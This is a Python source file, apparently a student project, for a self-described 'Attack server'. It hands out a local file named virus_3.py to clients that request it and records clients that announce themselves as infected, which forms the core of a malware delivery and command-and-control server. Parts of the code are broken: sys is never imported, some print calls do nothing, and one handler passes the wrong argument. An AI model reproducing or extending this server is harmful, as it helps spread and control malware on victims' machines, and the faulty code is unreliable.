"""
Erel Beger:
Receives commands from the client checks if the files exist
and executes them on the computer
at the end sends a message whether the operation
was performed successfully or not
if the server receives exit\\quit from the client or
the client falls the server
leaves and closes the sockets
"""
import socket
import threading

# constants
RELEASE_REQUEST = "release"
VIRUS_LOCATIO = 'C:\\Users' \
                '\\erelb\\' \
                'OneDrive\\' \
                'PycharmProjects\\' \
                'Project\\virus_3.py'
PORT = 1729
IP = "0.0.0.0"
MSG_LEN = 1024
CHUNK = 1024
EOF = b'-1'
LEN_NUMBER = 4
REQUEST = 0
PRMS = 1
LEN_ILLEGAL_REQUEST = 15
ILLEGAL_NUMBER = 9999


class Server(object):
    """
    The Attack server
    """
    def __init__(self, ip, port):
        """
        constructor
        """
        try:
            # initiating server socket
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # the server binds itself to a certain socket
            server_socket.bind((ip, port))
            # listening to the socket
            server_socket.listen(1)
            self.server_socket = server_socket
            self.thread_counter = 0
            self.ipsAndSockets = {}
            self.lock = threading.Lock()
            handle_clients = threading.Thread(target=self.handle_clients)
            handle_clients.start()
        except socket.error as msg:
            print('Connection failure: %s\n terminating program'), msg
            sys.exit(1)

    def receive_client_request(self, client_socket, address):
        """
        Receives the client's request and params
        """
        raw_size = client_socket.recv(LEN_NUMBER)
        data_size = raw_size.decode()
        if data_size.isdigit():
            raw_request = client_socket.recv(int(data_size))
            request = raw_request.decode()
            #  split to request and parameters
            req_and_prms = request.split()
            if len(req_and_prms) > 1:
                return req_and_prms[0], req_and_prms[PRMS::]
            else:
                return req_and_prms[REQUEST], None
        else:
            return None, None

    @staticmethod
    def send_response_to_client(response, client_socket):
        """
        Sends the response to the client
        """
        if response == "illegal request":
            #  sends a number that symbols illegal request
            part1 = str(ILLEGAL_NUMBER).encode()
            if isinstance(response, str):
                response = part1 + response.encode()
            else:
                response = part1 + response
            client_socket.send(response)
        else:
            #  sends legal response
            len1 = len(response)
            part1 = str(len1).zfill(LEN_NUMBER)
            part1 = part1.encode()
            if isinstance(response, str):
                response = part1 + response.encode()
            else:
                response = part1 + response
            client_socket.send(response)

    @staticmethod
    def send_file(f, client_socket):
        """
        Reads the file in chunks, sends it to the client,
        and returns if the sent
        """
        try:
            done = False
            with open(f, 'rb') as f:
                while not done:
                    chunk = f.read(CHUNK)
                    #  if reaches the end of the file
                    if chunk == b'':
                        done = True
                    else:
                        Server.send_response_to_client(chunk, client_socket)
            Server.send_response_to_client(EOF, client_socket)
            return "file sent"
        except Exception as ms:
            print(ms)

    @staticmethod
    def check_client_request(request):
        """
        Checks the client request and calling to function
        """
        request = request.upper()
        if str(request) == "SEND_FILE":
            return True
        elif str(request) == "I_AM_A_VIRUS":
            return True
        else:
            return False

    @staticmethod
    def quit_(client_socket):
        """
        Closes the client socket
        """
        try:
            client_socket.close()
            return "quit"
        except Exception as ms:
            return "illegal command"

    def handle_clients(self):
        """
        Receives the server socket and waits
        To customers and calls the
        action handle_single_client
        """
        done = False
        while not done:
            try:
                client_socket, address = self.server_socket.accept()
                clnt_thread = threading.Thread(
                    target=self.handle_single_client,
                    args=(client_socket, address))
                clnt_thread.start()
            except socket.error as msg:
                print("socket error"), msg
            except Exception as ms:
                print("The client asked to quit")
                Server.handle_clients(self.server_socket), ms

    def handle_single_client(self, client_socket, address):
        """
        receives the client's request until quits
        """
        num = self.thread_counter
        self.thread_counter += 1
        print("starting thread ", num)
        done = False
        while not done:
            try:
                command, params = self.receive_client_request(client_socket,
                                                              address)
                if command is not None:
                    valid = self.check_client_request(command)
                    if valid:
                        response = self.handle_client_request(command,
                                                              client_socket,
                                                              address)
                        self.send_response_to_client(response, client_socket)
                    else:
                        self.send_response_to_client("illegal request",
                                                     client_socket)
            except socket.error as msg:
                client_socket.close()
                print('Connection failure: %s\n ' % msg)
                done = True
            except Exception as ms:
                client_socket.close()
                print('The Client disconnected')
                done = True
        print("exiting thread", num)

    def handle_client_request(self, request, client_socket, address):
        """
        handle the client request
        """
        request = request.upper()
        if request == "SEND_FILE":
            return Server.send_file(VIRUS_LOCATIO, client_socket)
        if request == "I_AM_A_VIRUS":
            return self.add_new_socket_to_dictionary(client_socket, address)
        if request == "QUIT":
            return Server.quit_(client_socket)

    def add_new_socket_to_dictionary(self, client_socket, client_ip):
        """
        add new socket to dictionary
        """
        if client_ip in self.ipsAndSockets:
            return "This client is already exist"
        else:
            self.ipsAndSockets[client_ip] = client_socket
            return "The new computer was added"


def main():
    """
    The server receives date
    and sends the same data
    """
    server = Server(IP, PORT)
    server.handle_clients()


if __name__ == '__main__':
    main()